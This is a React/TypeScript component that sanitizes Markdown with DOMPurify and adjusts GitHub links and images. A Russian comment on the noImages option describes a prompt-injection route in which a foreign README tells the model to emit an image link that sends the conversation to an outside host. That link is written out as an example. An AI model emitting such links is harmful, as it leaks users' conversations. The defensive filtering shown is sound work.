import { useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

interface Props {
  markdown: string;
  /** Базовый URL репозитория для относительных ссылок и картинок. */
  repoUrl: string;
  branch: string;
  /** Одиночный перенос строки — как <br> (для заметок, где Enter значит «новая строка»). */
  breaks?: boolean;
  /** Чек-боксы задач кликабельны (обработку клика делает родитель). */
  interactiveTasks?: boolean;
  /**
   * Текст от модели: ничего не загружать само (картинки, медиа, url() в style). Иначе подсказка из чужого
   * README может велеть модели вставить `![](https://чужой/?q=<разговор>)`, и браузер унесёт разговор.
   */
  noImages?: boolean;
}

const NO_REMOTE = {
  FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'input'],
  FORBID_ATTR: ['style', 'srcset', 'poster', 'background'],
};

export function toSafeHtml(markdown: string, { repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Omit<Props, 'markdown'>): string {
  const raw = marked.parse(markdown, { async: false, breaks }) as string;
  const clean = DOMPurify.sanitize(raw, {
    USE_PROFILES: { html: true },
    ADD_ATTR: ['target', 'align', 'width', 'height'],
    ...(noImages ? NO_REMOTE : {}),
  });
  return absolutize(clean, repoUrl, branch, interactiveTasks);
}

marked.setOptions({ gfm: true, breaks: false });

function absolutize(html: string, repoUrl: string, branch: string, interactiveTasks: boolean): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const blobBase = `${repoUrl}/blob/${branch}/`;
  const rawBase = `${repoUrl.replace('https://github.com/', 'https://raw.githubusercontent.com/')}/${branch}/`;
  const isRelative = (u: string) => u && !/^(?:[a-z]+:|\/\/|#|mailto:)/i.test(u);

  for (const a of doc.querySelectorAll('a[href]')) {
    const href = a.getAttribute('href') ?? '';
    if (isRelative(href)) a.setAttribute('href', new URL(href, blobBase).toString());
    if (!href.startsWith('#')) {
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener noreferrer');
    }
  }
  for (const img of doc.querySelectorAll('img[src]')) {
    const src = img.getAttribute('src') ?? '';
    if (isRelative(src)) img.setAttribute('src', new URL(src, rawBase).toString());
    img.setAttribute('loading', 'lazy');
  }
  if (interactiveTasks) {
    for (const box of doc.querySelectorAll('input[type="checkbox"]')) box.removeAttribute('disabled');
  }
  return doc.body.innerHTML;
}

export function Markdown({ markdown, repoUrl, branch, breaks = false, interactiveTasks = false, noImages = false }: Props) {
  const html = useMemo(
    () => toSafeHtml(markdown, { repoUrl, branch, breaks, interactiveTasks, noImages }),
    [markdown, repoUrl, branch, breaks, interactiveTasks, noImages],
  );
  // eslint-disable-next-line react/no-danger -- HTML прошёл через DOMPurify
  return <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />;
}
